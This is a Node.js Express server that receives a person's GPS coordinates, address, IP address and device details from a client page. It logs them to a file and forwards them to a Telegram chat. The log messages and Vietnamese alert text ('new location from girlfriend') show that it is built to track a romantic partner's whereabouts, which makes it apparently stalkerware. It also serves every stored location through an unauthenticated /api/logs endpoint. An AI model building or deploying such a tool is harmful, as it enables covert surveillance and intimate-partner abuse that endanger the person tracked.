require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3030;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

const LOG_FILE = path.join(__dirname, 'location_logs.json');

// API endpoint to receive location from client
app.post('/api/location', async (req, res) => {
  const { latitude, longitude, accuracy, address, timestamp, device } = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

  const logEntry = {
    receivedAt: new Date().toISOString(),
    latitude,
    longitude,
    googleMapsUrl,
    accuracy: `${accuracy}m`,
    address: address || 'N/A',
    timestamp,
    clientIp,
    userAgent: req.headers['user-agent']
  };

  console.log('\n========================================');
  console.log('💖 RECEIVED LOVER LOCATION UPDATE 💖');
  console.log(`📍 Coordinates : ${latitude}, ${longitude}`);
  console.log(`🗺️ Google Maps : ${googleMapsUrl}`);
  console.log(`🏠 Address     : ${address || 'Fetching address...'}`);
  console.log(`🎯 Accuracy    : ±${accuracy} meters`);
  console.log(`⏰ Time        : ${new Date(timestamp).toLocaleString('vi-VN')}`);
  console.log(`🌐 IP Address  : ${clientIp}`);
  console.log('========================================\n');

  // Save to local logs file
  try {
    let logs = [];
    if (fs.existsSync(LOG_FILE)) {
      const data = fs.readFileSync(LOG_FILE, 'utf8');
      logs = JSON.parse(data || '[]');
    }
    logs.unshift(logEntry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving location log:', err);
  }

  // Telegram notification integration (if configured)
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (botToken && chatId) {
    try {
      const message = `💖 *VỊ TRÍ MỚI TỪ BẠN GÁI!* 💖\n\n` +
        `📍 *Tọa độ:* \`${latitude}, ${longitude}\`\n` +
        `🏠 *Địa chỉ:* ${address || 'Chưa xác định'}\n` +
        `🎯 *Độ chính xác:* ±${accuracy}m\n` +
        `⏰ *Thời gian:* ${new Date().toLocaleString('vi-VN')}\n\n` +
        `👉 *Mở trên Google Maps:* ${googleMapsUrl}`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      console.log('📱 Telegram alert sent successfully!');
    } catch (telegramErr) {
      console.error('Failed to send Telegram alert:', telegramErr.message);
    }
  }

  res.json({ status: 'success', message: 'Location received' });
});

// Endpoint to view logs (for testing)
app.get('/api/logs', (req, res) => {
  if (fs.existsSync(LOG_FILE)) {
    const data = fs.readFileSync(LOG_FILE, 'utf8');
    res.json(JSON.parse(data || '[]'));
  } else {
    res.json([]);
  }
});

module.exports = app;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`💖 Love Location Server running on http://localhost:${PORT}`);
  });
}
